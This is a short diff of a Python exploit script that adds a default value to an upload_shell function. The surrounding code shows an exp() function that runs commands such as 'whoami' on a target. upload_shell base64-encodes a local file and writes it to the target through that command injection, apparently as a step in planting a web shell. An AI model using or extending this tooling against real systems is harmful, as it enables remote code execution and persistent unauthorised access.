@@ -41,7 +41,7 @@ def exp(target:Target,url:str = None,cmd:str = "whoami", verbose:bool = True) ->
         return result
 
 
-def upload_shell(target:Target, file_path:str):
+def upload_shell(target:Target, file_path:str=""):
     with open(file_path,"rb") as f:
         b64_encoded_file=base64.b64encode(f.read()).decode()
     exp(target=target,cmd=f"echo {b64_encoded_file} > {basename(file_path)}.txt",verbose=False)
